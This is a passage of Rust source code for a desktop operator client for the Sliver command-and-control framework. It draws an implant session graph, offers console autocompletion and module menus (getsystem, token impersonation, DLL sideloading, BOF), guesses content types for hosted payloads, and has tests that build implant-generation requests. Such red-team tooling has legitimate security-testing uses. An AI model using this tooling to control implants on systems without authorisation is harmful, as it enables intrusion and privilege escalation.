            ui.colored_label(Palette::border(), "━");
            ui.colored_label(Palette::muted(), "egress");
            ui.colored_label(Palette::purple(), "╍");
            ui.colored_label(Palette::muted(), "pivot");
        });

        // Parent session for chained implants, from the server's pivot graph.
        fn walk(e: &clientpb::PivotGraphEntry, parent: Option<&str>, out: &mut HashMap<String, String>) {
            let id = e.session.as_ref().map(|s| s.id.clone()).unwrap_or_default();
            if let (Some(p), false) = (parent, id.is_empty()) { out.insert(id.clone(), p.to_string()); }
            for c in &e.children { walk(c, if id.is_empty() { parent } else { Some(&id) }, out); }
        }
        let mut parent_of: HashMap<String, String> = HashMap::new();
        if let Some(g) = &self.pivots {
            for e in &g.children { walk(e, None, &mut parent_of); }
        }

        // Collect host nodes from sessions and beacons.
        // The card shows only a status dot and the implant name; everything else is in
        // the hover card (`details`).
        struct Node { target: Target, store: String, title: String, color: egui::Color32, beacon: bool, transport: String, dead: bool, details: Vec<(&'static str, String)> }
        let now = chrono::Local::now().timestamp();
        let seen = |t: i64| if t > 0 { format!("{} ({} ago)", fmt_clock(t), fmt_age(t)) } else { "—".into() };
        let or_dash = |s: &str| if s.is_empty() { "—".to_string() } else { s.to_string() };
        let mut nodes: Vec<Node> = Vec::new();
        for s in &self.sessions {
            nodes.push(Node {
                target: Target::session(&s.id),
                store: format!("{}|{}", s.hostname, s.name),
                title: if s.name.is_empty() { s.hostname.clone() } else { s.name.clone() },
                color: integrity_color(&s.integrity, &s.username, &s.os),
                beacon: false,
                transport: s.transport.clone(),
                dead: s.is_dead,
                details: vec![
                    ("Type", "session".into()),
                    ("Host", or_dash(&s.hostname)),
                    ("User", or_dash(&s.username)),
                    ("Integrity", or_dash(&s.integrity)),
                    ("OS", format!("{} {}", s.os, s.arch)),
                    ("Transport", or_dash(&s.transport)),
                    ("Remote", or_dash(&s.remote_address)),
                    ("PID", s.pid.to_string()),
                    ("Last check-in", seen(s.last_checkin)),
                    ("ID", s.id.clone()),
                ],
            });
        }
        for b in &self.beacons {
            let next = b.next_checkin - now;
            nodes.push(Node {
                target: Target::beacon(&b.id),
                store: format!("{}|{}", b.hostname, b.name),
                title: if b.name.is_empty() { b.hostname.clone() } else { b.name.clone() },
                color: Palette::muted(),
                beacon: true,
                transport: "beacon".into(),
                dead: b.is_dead,
                details: vec![
                    ("Type", "beacon".into()),
                    ("Host", or_dash(&b.hostname)),
                    ("User", or_dash(&b.username)),
                    ("Integrity", or_dash(&b.integrity)),
                    ("OS", format!("{} {}", b.os, b.arch)),
                    ("Transport", or_dash(&b.transport)),
                    ("Remote", or_dash(&b.remote_address)),
                    ("PID", b.pid.to_string()),
                    ("Last check-in", seen(b.last_checkin)),
                    ("Interval", format!("{}s ± {}s", b.interval / 1_000_000_000, b.jitter / 1_000_000_000)),
                    ("Next check-in", if next <= 0 { "due".into() } else { format!("in {next}s") }),
                    ("Pending tasks", (b.tasks_count - b.tasks_count_completed).to_string()),
                    ("ID", b.id.clone()),
                ],
            });
        }

        let (rect, _resp) = ui.allocate_exact_size(ui.available_size(), egui::Sense::hover());
        let painter = ui.painter_at(rect);
        painter.rect_filled(rect, 6.0, Palette::bg());
        // Subtle dot grid.
        let step = 28.0;
        let mut x = rect.left() + step * 0.5;
        while x < rect.right() {
            let mut y = rect.top() + step * 0.5;
            while y < rect.bottom() {
                painter.circle_filled(egui::pos2(x, y), 0.8, Palette::border());
                y += step;
            }
            x += step;
        }
        let center = rect.center();

        // Draw the C2 server hub.
        let hub_r = 32.0;
        painter.circle_filled(center, hub_r + 6.0, Palette::accent().linear_multiply(0.08));
        painter.circle_filled(center, hub_r, Palette::panel_hi());
        painter.circle_stroke(center, hub_r, egui::Stroke::new(2.0_f32, Palette::accent()));
        painter.text(center, egui::Align2::CENTER_CENTER, "C2", egui::FontId::proportional(16.0), Palette::accent());

        if nodes.is_empty() {
            painter.text(center + egui::vec2(0.0, 60.0), egui::Align2::CENTER_CENTER,
                "no implants connected", egui::FontId::proportional(14.0), Palette::muted());
            return;
        }

        let card = egui::vec2(132.0, 26.0);
        // Ring as an ellipse that fits the pane, so cards never clip.
        let rx = (rect.width() * 0.5 - card.x * 0.5 - 24.0).max(120.0);
        let ry = (rect.height() * 0.5 - card.y * 0.5 - 14.0).max(60.0);
        let mut clicked: Option<Target> = None;

        // Root (egress) nodes go on the ring; chained nodes fan out from their parent.
        let present: std::collections::HashSet<String> = nodes.iter().map(|n| n.target.key()).collect();
        let is_child = |n: &Node| !n.beacon && parent_of.get(&n.target.key()).is_some_and(|p| present.contains(p));
        let roots: Vec<usize> = (0..nodes.len()).filter(|i| !is_child(&nodes[*i])).collect();
        let mut auto: HashMap<String, egui::Pos2> = HashMap::new();
        // A flat ellipse bunches cards near its ends, so each ring card moves along the
        // ring (or inward) until it overlaps nothing placed so far. Cards the operator
        // dragged keep their spot and count as obstacles.
        let mut placed: Vec<egui::Pos2> = nodes.iter()
            .filter_map(|n| self.graph_pos.get(&n.store).map(|f| rect.lerp_inside(f.to_vec2()))).collect();
        for (ri, &i) in roots.iter().enumerate() {
            let ang = std::f32::consts::TAU * (ri as f32) / (roots.len() as f32) - std::f32::consts::FRAC_PI_2;
            let mut pos = center + egui::vec2(ang.cos() * rx, ang.sin() * ry);
            if !self.graph_pos.contains_key(&nodes[i].store) {
                pos = ring_spot(ang, center, egui::vec2(rx, ry), card, rect, &placed).unwrap_or(pos);
                placed.push(pos);
            }
            auto.insert(nodes[i].target.key(), pos);
        }
        // Place children breadth-first, a step further out from the parent.
        let mut pending: Vec<usize> = (0..nodes.len()).filter(|i| is_child(&nodes[*i])).collect();
        let mut child_n: HashMap<String, usize> = HashMap::new();
        for _ in 0..8 {
            pending.retain(|&i| {
                let key = nodes[i].target.key();
                let parent = &parent_of[&key];
                let Some(pp) = self.graph_pos.get(nodes.iter().find(|n| &n.target.key() == parent).map(|n| n.store.as_str()).unwrap_or(""))
                    .map(|f| rect.lerp_inside(f.to_vec2())).or_else(|| auto.get(parent).copied()) else { return true };
                let k = child_n.entry(parent.clone()).or_default();
                let n = *k as f32;
                *k += 1;
                // Search around the parent (outward first, then rotating away from
                // the hub) for a spot inside the pane that overlaps no other card.
                let dir = (pp - center).normalized();
                let fits = |p: egui::Pos2| rect.shrink2(card * 0.5).contains(p);
                let clear = |p: egui::Pos2, placed: &HashMap<String, egui::Pos2>| {
                    let r = egui::Rect::from_center_size(p, card + egui::vec2(16.0, 12.0));
                    placed.values().all(|q| !r.intersects(egui::Rect::from_center_size(*q, card)))
                };
                let mut pos = pp + dir * 140.0;
                'search: for dist in [card.x * 0.5 + 40.0, card.x + 30.0, card.x + 110.0] {
                    for deg in [0.0f32, 40.0, -40.0, 80.0, -80.0, 120.0, -120.0, 160.0, -160.0, 180.0] {
                        let a = deg.to_radians() + n * 0.35;
                        let d = egui::vec2(dir.x * a.cos() - dir.y * a.sin(), dir.x * a.sin() + dir.y * a.cos());
                        // Cards are wide and short: squash vertical distance.
                        let cand = pp + egui::vec2(d.x * dist, d.y * dist * 0.45);
                        if fits(cand) && clear(cand, &auto) { pos = cand; break 'search; }
                    }
                }
                pos.x = pos.x.clamp(rect.left() + card.x * 0.5, rect.right() - card.x * 0.5);
                pos.y = pos.y.clamp(rect.top() + card.y * 0.5, rect.bottom() - card.y * 0.5);
                auto.insert(key, pos);
                false
            });
        }

        // Stored positions are kept even for hosts not currently listed: at
        // startup sessions and beacons arrive separately, and pruning then
        // would wipe the saved layout.

        // Resolve positions (dragging updates storage).
        let mut pos_of: HashMap<String, egui::Pos2> = HashMap::new();
        let mut hovered: HashMap<String, bool> = HashMap::new();
        for node in &nodes {
            let key = node.target.key();
            let mut pos = self.graph_pos.get(&node.store).map(|f| rect.lerp_inside(f.to_vec2()))
                .or_else(|| auto.get(&key).copied()).unwrap_or(center);
            let node_rect = egui::Rect::from_center_size(pos, card);
            let resp = ui.interact(node_rect, egui::Id::new(("graphnode", key.clone())), egui::Sense::click_and_drag());
            if resp.dragged() {
                pos += resp.drag_delta();
                pos.x = pos.x.clamp(rect.left() + card.x * 0.5, rect.right() - card.x * 0.5);
                pos.y = pos.y.clamp(rect.top() + card.y * 0.5, rect.bottom() - card.y * 0.5);
                let f = (pos - rect.min) / rect.size();
                self.graph_pos.insert(node.store.clone(), egui::pos2(f.x, f.y));
            }
            if resp.drag_stopped() { self.settings_dirty = true; }
            if resp.clicked() { clicked = Some(node.target.clone()); }
            if resp.hovered() {
                ui.ctx().set_cursor_icon(if resp.dragged() { egui::CursorIcon::Grabbing } else { egui::CursorIcon::Grab });
            }
            let resp = resp.on_hover_ui(|ui| node_hover_card(ui, &node.title, node.dead, &node.details));
            hovered.insert(key.clone(), resp.hovered());
            pos_of.insert(key, pos);
        }

        let any_hover = hovered.values().any(|h| *h);
        // Edges first, so cards draw over them. A hovered card's edge is highlighted.
        for node in &nodes {
            let key = node.target.key();
            let pos = pos_of[&key];
            let lit = hovered.get(&key).copied().unwrap_or(false);
            // While one card is hovered, the other edges step back.
            let dim = any_hover && !lit;
            let parent = parent_of.get(&key).filter(|p| pos_of.contains_key(*p));
            match parent {
                Some(p) => {
                    let from = pos_of[p];
                    let dir = (pos - from).normalized();
                    let a = from + dir * (card.y * 0.55);
                    let b = pos - dir * (card.y * 0.55);
                    painter.extend(egui::Shape::dashed_line(&[a, b], egui::Stroke::new(if lit { 2.6_f32 } else { 1.8_f32 }, Palette::purple()), 7.0, 4.0));
                    let mid = a + (b - a) * 0.5;
                    edge_label(&painter, mid, &node.transport, Palette::purple());
                }
                None => {
                    let dir = (pos - center).normalized();
                    let a = center + dir * hub_r;
                    let b = pos - dir * (card.y * 0.5);
                    if node.dead {
                        painter.extend(egui::Shape::dashed_line(&[a, b], egui::Stroke::new(1.5_f32, Palette::red().linear_multiply(0.6)), 4.0, 5.0));
                    } else if lit {
                        painter.line_segment([a, b], egui::Stroke::new(2.2_f32, Palette::accent()));
                    } else {
                        painter.line_segment([a, b], egui::Stroke::new(1.5_f32, if dim { Palette::border().linear_multiply(0.5) } else { Palette::border() }));
                    }
                    let mid = a + (b - a) * 0.55;
                    edge_label(&painter, mid, &node.transport, if lit { Palette::text() } else if dim { Palette::muted().linear_multiply(0.5) } else { Palette::muted() });
                }
            }
        }
        for node in &nodes {
            let key = node.target.key();
            let node_rect = egui::Rect::from_center_size(pos_of[&key], card);
            let hover = hovered.get(&key).copied().unwrap_or(false);
            let fill = if hover { Palette::panel_hi() } else { Palette::panel() };
            let r = card.y * 0.5;
            painter.rect_filled(node_rect.translate(egui::vec2(0.0, 2.0)), r, egui::Color32::from_black_alpha(36));
            // Border carries the privilege colour; dead implants fade with a red outline.
            let edge = if node.dead { Palette::red().linear_multiply(0.7) } else if hover { node.color } else { node.color.linear_multiply(0.75) };
            painter.rect(node_rect, r, fill, egui::Stroke::new(if hover { 2.0_f32 } else { 1.4_f32 }, edge));
            // Status dot: filled = live, hollow red = dead.
            let dot = node_rect.left_center() + egui::vec2(13.0, 0.0);
            if node.dead {
                painter.circle_stroke(dot, 4.0, egui::Stroke::new(1.5_f32, Palette::red()));
            } else {
                painter.circle_filled(dot, 4.0, if node.beacon { Palette::muted() } else { node.color });
            }
            // Name, shortened to fit.
            let font = egui::FontId::proportional(12.5);
            let room = node_rect.width() - 34.0;
            let mut title = node.title.clone();
            let mut n = title.chars().count();
            while n > 1 && painter.layout_no_wrap(title.clone(), font.clone(), Palette::text()).size().x > room {
                n -= 1;
                title = elide(&node.title, n);
            }
            painter.text(node_rect.left_center() + egui::vec2(24.0, 0.0), egui::Align2::LEFT_CENTER,
                title, font, if node.dead || node.beacon { Palette::muted() } else { Palette::text() });
        }

        if let Some(t) = clicked {
            self.pending_open.push(Tab::Console(t));
        }
    }
}

/// Completion candidates (value + description) for a session console: the
/// built-in verbs, only on the first token (arguments are programs/paths we
/// can't predict).
fn session_console_candidates(input: &str) -> Vec<(String, String)> {
    if input.contains(char::is_whitespace) {
        return Vec::new();
    }
    [
        ("ls", "list a directory (ls [path])"),
        ("cd", "change the implant's working directory (cd <path>)"),
        ("ps", "list processes (text)"),
        ("procs", "open the process browser"),
        ("pwd", "print working directory"),
        ("cp", "copy a file (cp <src> <dst>)"),
        ("mv", "move / rename (mv <src> <dst>)"),
        ("chmod", "change permissions (chmod <mode> <path>)"),
        ("clear", "clear this console"),
        ("help", "list these commands"),
        ("download", "save a remote file locally (download <path>)"),
        ("upload", "pick a local file and upload it, tracked as an IOC (upload [remote path])"),
        ("mkdir", "create a directory (mkdir <path>)"),
        ("rm", "remove a file/dir (rm [-r] <path>)"),
        ("screenshot", "capture the target's screen"),
    ]
    .iter()
    .map(|(v, d)| (v.to_string(), d.to_string()))
    .collect()
}

/// A command-completion popup for a console input. Completes the current
/// (last whitespace-separated) token of `input` from `candidates`. Tab or a
/// click accepts the highlighted match; ↑/↓ move the highlight; Enter is left
/// alone so it still submits the line. Returns true if `input` was changed.
fn command_autocomplete(
    ui: &mut egui::Ui,
    resp: &egui::Response,
    input_id: egui::Id,
    input: &mut String,
    candidates: &[(String, String)],
) -> bool {
    if !resp.has_focus() {
        return false;
    }
    let token_start = input.rfind(char::is_whitespace).map(|i| i + 1).unwrap_or(0);
    let token = input[token_start..].to_string();
    if token.is_empty() {
        return false;
    }
    let tok_lc = token.to_lowercase();
    let matches: Vec<&(String, String)> = candidates
        .iter()
        .filter(|(value, _)| {
            let cl = value.to_lowercase();
            cl.starts_with(&tok_lc) && cl != tok_lc
        })
        .collect();
    if matches.is_empty() {
        return false;
    }

    let sel_id = input_id.with("ac_sel");
    let mut sel: usize = ui.memory(|m| m.data.get_temp::<usize>(sel_id)).unwrap_or(0);
    if ui.input_mut(|i| i.consume_key(egui::Modifiers::NONE, egui::Key::ArrowDown)) {
        sel += 1;
    }
    if ui.input_mut(|i| i.consume_key(egui::Modifiers::NONE, egui::Key::ArrowUp)) {
        sel = sel.wrapping_add(matches.len()).wrapping_sub(1);
    }
    sel %= matches.len();
    let accept_tab = ui.input_mut(|i| i.consume_key(egui::Modifiers::NONE, egui::Key::Tab));

    let mut chosen: Option<String> = None;
    egui::Area::new(input_id.with("ac_area"))
        .order(egui::Order::Foreground)
        .fixed_pos(resp.rect.left_bottom() + egui::vec2(0.0, 2.0))
        .show(ui.ctx(), |ui| {
            egui::Frame::popup(ui.style()).show(ui, |ui| {
                ui.set_min_width(resp.rect.width().min(460.0).max(220.0));
                for (i, (value, desc)) in matches.iter().enumerate() {
                    let mut job = egui::text::LayoutJob::default();
                    job.append(value, 0.0, egui::TextFormat {
                        font_id: egui::FontId::monospace(13.0),
                        color: if i == sel { Palette::text() } else { Palette::accent() },
                        ..Default::default()
                    });
                    if !desc.is_empty() {
                        job.append(&format!("   {desc}"), 0.0, egui::TextFormat {
                            font_id: egui::FontId::proportional(12.0),
                            color: Palette::muted(),
                            ..Default::default()
                        });
                    }
                    if ui.selectable_label(i == sel, job).clicked() {
                        chosen = Some(value.clone());
                    }
                }
            });
        });

    let pick = chosen.or_else(|| accept_tab.then(|| matches[sel].0.clone()));
    ui.memory_mut(|m| m.data.insert_temp(sel_id, sel));
    if let Some(choice) = pick {
        input.truncate(token_start);
        input.push_str(&choice);
        input.push(' ');
        ui.memory_mut(|m| m.data.insert_temp::<usize>(sel_id, 0));
        return true;
    }
    false
}

/// Shorten `s` to at most `max` characters, ending with an ellipsis.
/// The first spot near angle `ang` on the graph's ring (stepping along it both ways,
/// then on smaller rings) where a card fits in `pane` without touching `placed`.
fn ring_spot(ang: f32, center: egui::Pos2, radii: egui::Vec2, card: egui::Vec2, pane: egui::Rect, placed: &[egui::Pos2]) -> Option<egui::Pos2> {
    let fits = |p: egui::Pos2| pane.shrink2(card * 0.5).contains(p);
    let clear = |p: egui::Pos2| {
        let r = egui::Rect::from_center_size(p, card + egui::vec2(12.0, 8.0));
        placed.iter().all(|q| !r.intersects(egui::Rect::from_center_size(*q, card)))
    };
    for scale in [1.0f32, 0.75, 0.5] {
        for step in 0..30 {
            for sign in [1.0f32, -1.0] {
                let a = ang + sign * step as f32 * 0.05;
                let cand = center + egui::vec2(a.cos() * radii.x * scale, a.sin() * radii.y * scale);
                if fits(cand) && clear(cand) { return Some(cand); }
            }
        }
    }
    None
}

/// A transport label on a background chip at an edge's midpoint, so the line
/// doesn't run through the text.
fn edge_label(painter: &egui::Painter, at: egui::Pos2, text: &str, color: egui::Color32) {
    let galley = painter.layout_no_wrap(text.to_string(), egui::FontId::proportional(10.0), color);
    let rect = egui::Rect::from_center_size(at, galley.size() + egui::vec2(8.0, 2.0));
    painter.rect_filled(rect, 3.0, Palette::bg());
    painter.galley(rect.center() - galley.size() * 0.5, galley, color);
}

/// A right-aligned process ID (numbers line up).
fn pid_cell(ui: &mut egui::Ui, pid: i32) {
    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| { ui.add_space(12.0); ui.monospace(pid.to_string()); });
}

/// The Session Graph's hover card: the implant's name and status, then its details.
fn node_hover_card(ui: &mut egui::Ui, title: &str, dead: bool, details: &[(&'static str, String)]) {
    ui.set_max_width(380.0);
    ui.horizontal(|ui| {
        ui.label(egui::RichText::new(title).strong());
        if dead { ui.colored_label(Palette::red(), "dead"); } else { ui.colored_label(Palette::green(), "live"); }
    });
    ui.separator();
    egui::Grid::new("graph-hover").num_columns(2).striped(false).spacing([14.0, 4.0]).show(ui, |ui| {
        for (k, v) in details {
            ui.colored_label(Palette::muted(), *k);
            if *k == "ID" || *k == "Remote" { ui.monospace(v); } else { ui.label(v); }
            ui.end_row();
        }
    });
    ui.add_space(2.0);
    ui.colored_label(Palette::muted(), egui::RichText::new("click to open its console").small());
}

fn elide(s: &str, max: usize) -> String {
    if s.chars().count() <= max { return s.to_string(); }
    let mut out: String = s.chars().take(max.saturating_sub(1)).collect();
    out.push('…');
    out
}

/// Dock styling tuned to the active theme: a quiet tab bar, an accent
/// underline on the focused tab, and a slim separator.
fn dock_style(ctx: &egui::Context) -> DockStyle {
    let mut st = DockStyle::from_egui(ctx.style().as_ref());
    st.tab_bar.bg_fill = Palette::bg();
    st.tab_bar.hline_color = Palette::border();
    st.tab_bar.height = 28.0;
    st.tab.tab_body.bg_fill = Palette::panel();
    st.tab.tab_body.stroke = egui::Stroke::new(1.0_f32, Palette::border());
    st.tab.tab_body.inner_margin = egui::Margin::same(8.0);
    st.tab.hline_below_active_tab_name = true;
    let tab = |bg: egui::Color32, text: egui::Color32, outline: egui::Color32| egui_dock::TabInteractionStyle {
        outline_color: outline,
        rounding: egui::Rounding { nw: 6.0, ne: 6.0, sw: 0.0, se: 0.0 },
        bg_fill: bg,
        text_color: text,
    };
    st.tab.active = tab(Palette::panel(), Palette::text(), Palette::border());
    st.tab.focused = tab(Palette::panel(), Palette::accent(), Palette::accent().linear_multiply(0.6));
    st.tab.inactive = tab(Palette::bg(), Palette::muted(), egui::Color32::TRANSPARENT);
    st.tab.hovered = tab(Palette::panel_hi(), Palette::text(), Palette::border());
    st.tab.active_with_kb_focus = st.tab.active.clone();
    st.tab.focused_with_kb_focus = st.tab.focused.clone();
    st.tab.inactive_with_kb_focus = st.tab.inactive.clone();
    st.separator.width = 2.0;
    st.separator.color_idle = Palette::border();
    st.separator.color_hovered = Palette::accent().linear_multiply(0.7);
    st.separator.color_dragged = Palette::accent();
    st.buttons.close_tab_color = Palette::muted();
    st.buttons.close_tab_active_color = Palette::red();
    st.buttons.close_tab_bg_fill = Palette::panel_hi();
    st.overlay.selection_color = Palette::accent().linear_multiply(0.35);
    st
}

/// One console line with an optional timestamp gutter.
fn console_line(ui: &mut egui::Ui, line: &ConsoleLine) {
    let mut color = Palette::retheme(line.color);
    if color == Palette::text() { color = Palette::output(); }
    if line.time.is_empty() {
        ui.label(egui::RichText::new(&line.text).monospace().color(color));
    } else {
        ui.horizontal(|ui| {
            ui.label(egui::RichText::new(&line.time).monospace().small().color(Palette::muted()));
            ui.label(egui::RichText::new(&line.text).monospace().color(color));
        });
    }
}

/// Put the text cursor at the end of a single-line input (after history recall).
fn move_cursor_to_end(ui: &egui::Ui, id: egui::Id, text: &str) {
    if let Some(mut state) = egui::TextEdit::load_state(ui.ctx(), id) {
        let ccursor = egui::text::CCursor::new(text.chars().count());
        state.cursor.set_char_range(Some(egui::text::CCursorRange::one(ccursor)));
        state.store(ui.ctx(), id);
    }
}

/// Sliver's live/dead verdict for a session or beacon, as plain coloured text.
fn status_label(ui: &mut egui::Ui, dead: bool) {
    if dead {
        ui.colored_label(Palette::red(), "dead").on_hover_text("Sliver marks this implant dead: it has missed its check-ins");
    } else {
        ui.colored_label(Palette::green(), "live");
    }
}

fn legend(ui: &mut egui::Ui, color: egui::Color32, label: &str) {
    ui.colored_label(color, "●");
    ui.colored_label(Palette::muted(), label);
}

/// Map a Windows integrity string (and unix user) to a permission colour.
fn integrity_color(integrity: &str, username: &str, os: &str) -> egui::Color32 {
    let i = integrity.to_ascii_lowercase();
    if i.contains("system") || i.contains("high") {
        return Palette::red();
    }
    if os != "windows" && (username == "root" || username.ends_with("\\root")) {
        return Palette::red();
    }
    if i.contains("medium") || i.is_empty() {
        return Palette::accent();
    }
    Palette::accent()
}

fn text_row(ui: &mut egui::Ui, label: &str, value: &mut String) {
    ui.horizontal(|ui| {
        ui.add_sized([150.0, 18.0], egui::Label::new(label));
        ui.add(egui::TextEdit::singleline(value).desired_width(ui.available_width()));
    });
}

fn file_row(ui: &mut egui::Ui, label: &str, value: &mut String, exts: &[&str]) {
    ui.horizontal(|ui| {
        ui.add_sized([150.0, 18.0], egui::Label::new(label));
        if ui.button("…").clicked() {
            if let Some(p) = rfd::FileDialog::new().add_filter("files", exts).pick_file() {
                *value = p.display().to_string();
            }
        }
        ui.add(egui::TextEdit::singleline(value).desired_width(ui.available_width()));
    });
}

/// "Modules" entry for the session/beacon context menus: hovering opens a submenu of the
/// available modules (including "Open Modules tab"); the entry itself isn't clickable.
fn modules_submenu(ui: &mut egui::Ui, t: &Target, win: bool, actions: &mut Vec<(&'static str, Target)>) {
    ui.menu_button("✦  Modules", |ui| {
        let mut item = |ui: &mut egui::Ui, label: &str, kind: &'static str| {
            if ui.button(label).clicked() { actions.push((kind, t.clone())); ui.close_menu(); }
        };
        item(ui, "Open Modules tab", "modules");
        ui.separator();
        ui.colored_label(Palette::muted(), "Quick");
        if win {
            item(ui, "whoami", "mod-whoami");
            item(ui, "getprivs", "mod-getprivs");
            item(ui, "getsystem", "mod-getsystem");
            item(ui, "rev2self", "mod-rev2self");
        }
        item(ui, "ifconfig", "mod-ifconfig");
        item(ui, "netstat", "mod-netstat");
        item(ui, "env", "mod-env");
        ui.separator();
        ui.colored_label(Palette::muted(), "Modules tab");
        if win {
            item(ui, ".NET Assembly…", "mod-asm");
            item(ui, "Sideload…", "mod-sideload");
            item(ui, "Spawn DLL…", "mod-spawndll");
            item(ui, "BOF…", "mod-bof");
        } else {
            item(ui, "Sideload…", "mod-sideload");
        }
        item(ui, "Extensions…", "mod-ext");
        item(ui, "WASM extensions…", "mod-wasm");
        item(ui, "Environment…", "mod-envform");
        if win { item(ui, "migrate / impersonate / make-token…", "modules"); }
    });
}

fn run_button(ui: &mut egui::Ui, enabled: bool) -> bool {
    ui.add_space(8.0);
    ui.add_enabled(enabled, egui::Button::new(egui::RichText::new("▶ Run").strong())).clicked()
}

fn split_ws(s: &str) -> Vec<String> {
    s.split_whitespace().map(|x| x.to_string()).collect()
}

/// Parse a hex string (optionally space/colon separated) into bytes.
fn parse_hex(s: &str) -> Vec<u8> {
    let cleaned: String = s.chars().filter(|c| c.is_ascii_hexdigit()).collect();
    cleaned
        .as_bytes()
        .chunks(2)
        .filter_map(|pair| {
            let hi = (pair[0] as char).to_digit(16)?;
            let lo = pair.get(1).and_then(|b| (*b as char).to_digit(16)).unwrap_or(0);
            Some((hi * 16 + lo) as u8)
        })
        .collect()
}

/// Content-Type for a hosted file, from its extension.
fn guess_content_type(name: &str) -> &'static str {
    let ext = name.rsplit_once('.').map(|(_, e)| e.to_ascii_lowercase()).unwrap_or_default();
    match ext.as_str() {
        "txt" | "ps1" | "psm1" | "bat" | "cmd" | "sh" | "vbs" | "py" => "text/plain",
        "html" | "htm" | "hta" => "text/html",
        "js" => "application/javascript",
        "json" => "application/json",
        "xml" => "application/xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "pdf" => "application/pdf",
        "zip" => "application/zip",
        _ => "application/octet-stream",
    }
}

fn human_size(bytes: i64) -> String {
    const UNITS: [&str; 5] = ["B", "KB", "MB", "GB", "TB"];
    let mut size = bytes as f64;
    let mut i = 0;
    while size >= 1024.0 && i < UNITS.len() - 1 {
        size /= 1024.0;
        i += 1;
    }
    if i == 0 {
        format!("{bytes} B")
    } else {
        format!("{size:.1} {}", UNITS[i])
    }
}

fn fmt_time(unix: i64) -> String {
    if unix <= 0 {
        return "—".into();
    }
    chrono::DateTime::from_timestamp(unix, 0)
        .map(|dt| dt.with_timezone(&chrono::Local).format("%Y-%m-%d %H:%M").to_string())
        .unwrap_or_else(|| "—".into())
}

// Silence unused import warnings for re-exported proto modules used only in some builds.
#[allow(unused_imports)]
use commonpb as _commonpb;
#[allow(dead_code)]
const _NODE: Option<NodeIndex> = None;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tab_completes_in_the_console_box() {
        // Same widget setup as the consoles: type "he", press Tab, expect "help " and focus kept.
        let ctx = egui::Context::default();
        let id = egui::Id::new("tab-test-input");
        let candidates = vec![("help".to_string(), String::new()), ("hosts".to_string(), String::new())];
        let mut input = String::new();
        let key = |k: egui::Key| egui::Event::Key { key: k, physical_key: None, pressed: true, repeat: false, modifiers: egui::Modifiers::NONE };
        let frames: Vec<Vec<egui::Event>> = vec![vec![], vec![], vec![egui::Event::Text("he".into())], vec![], vec![key(egui::Key::Tab)], vec![], vec![]];
        for (n, events) in frames.into_iter().enumerate() {
            let raw = egui::RawInput { events, ..Default::default() };
            let _ = ctx.run(raw, |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    let resp = ui.horizontal(|ui| {
                        let r = ui.add(egui::TextEdit::singleline(&mut input).id(id).lock_focus(true));
                        let _ = ui.button("Run");
                        r
                    }).inner;
                    if n == 0 { resp.request_focus(); }
                    command_autocomplete(ui, &resp, id, &mut input, &candidates);
                });
            });
        }
        assert_eq!(input, "help ");
        assert!(ctx.memory(|m| m.has_focus(id)), "Tab moved focus off the input");
    }

    #[test]
    fn generate_request_transports_and_limits() {
        let f = GenerateForm {
            os: "linux".into(), arch: "amd64".into(),
            mtls: "198.51.100.5".into(), http: "c2.example.com".into(), dns: "d.example.com.".into(),
            wg: "198.51.100.5:53".into(), tcp_pivot: "192.0.2.20".into(), named_pipe: "192.0.2.20/pipe/x".into(),
            c2_profile: "custom".into(), canary: "a.canary.com, b.canary.com".into(),
            limit_hostname: " test-host ".into(), limit_username: "operator".into(), limit_domain_joined: true,
            limit_datetime: "2026-12-31T23:59:59Z".into(),
            ..Default::default()
        };
        let (c, _, _) = build_generate_request(&f);
        let urls: Vec<&str> = c.c2.iter().map(|x| x.url.as_str()).collect();
        assert_eq!(urls, vec![
            "mtls://198.51.100.5:8888", "https://c2.example.com", "dns://d.example.com.",
            "wg://198.51.100.5:53", "tcppivot://192.0.2.20:9898", "namedpipe://192.0.2.20/pipe/x",
        ]);
        // Priorities are sequential in declaration order.
        assert!(c.c2.iter().enumerate().all(|(i, x)| x.priority == i as u32));
        assert!(c.include_mtls && c.include_http && c.include_dns && c.include_wg && c.include_tcp && c.include_name_pipe);
        assert_eq!((c.wg_key_exchange_port, c.wg_tcp_comms_port), (1337, 8888));
        assert_eq!(c.httpc2_config_name, "custom");
        assert_eq!(c.canary_domains, vec!["a.canary.com", "b.canary.com"]);
        assert_eq!(c.limit_hostname, "test-host");
        assert!(c.limit_domain_joined);
        assert_eq!(c.limit_datetime, "2026-12-31T23:59:59Z");
    }

    #[test]
    fn listener_settings_round_trip_and_job_guesses() {
        let specs = [
            ListenerSpec::Mtls { host: "198.51.100.5".into(), port: 8888 },
            ListenerSpec::Https { host: "0.0.0.0".into(), domain: "c2.example.com".into(), port: 443, secure: true, website: "files".into(),
                tls: ListenerTls::Files { cert: "/tmp/c2.crt".into(), key: "/tmp/c2.key".into() } },
            ListenerSpec::Https { host: "0.0.0.0".into(), domain: "c2.example.com".into(), port: 8443, secure: true, website: String::new(), tls: ListenerTls::Acme },
            ListenerSpec::Dns { domains: vec!["a.example.com.".into(), "b.example.com.".into()], host: "0.0.0.0".into(), port: 53, canaries: true },
            ListenerSpec::Stage { bind_host: "0.0.0.0".into(), bind_port: 8443, c2: "198.51.100.5:8888".into() },
            ListenerSpec::Wg { host: "0.0.0.0".into(), port: 8890, nport: 9000, key_port: 2000 },
        ];
        for spec in specs {
            assert_eq!(format!("{:?}", spec_of_preset(&preset_of_spec(&spec))), format!("{spec:?}"));
        }
        // Edit opens with what Sliver reports; mTLS's bind address comes from the description.
        let job = |name: &str, port, desc: &str| clientpb::Job { name: name.into(), port, description: desc.into(), domains: vec![String::new()], ..Default::default() };
        let m = preset_of_job(&job("mtls", 8888, "mutual tls listener 192.0.2.10:8888"));
        assert_eq!((m.kind, m.host.as_str(), m.port), (0, "192.0.2.10", 8888));
        let h = preset_of_job(&job("https", 443, "https for domain "));
        assert_eq!((h.kind, h.secure, h.domain.as_str()), (1, true, ""));
        let w = preset_of_job(&job("wg", 8890, "wg listener port: 8890"));
        assert_eq!((w.kind, w.port, w.wg_nport, w.wg_key_port), (4, 8890, 8888, 1337));
        assert_ne!(listener_key("s", 0, 8888), listener_key("s", 4, 8888));
    }

    #[test]
    fn selected_transport_is_primary_with_its_ports() {
        let f = GenerateForm {
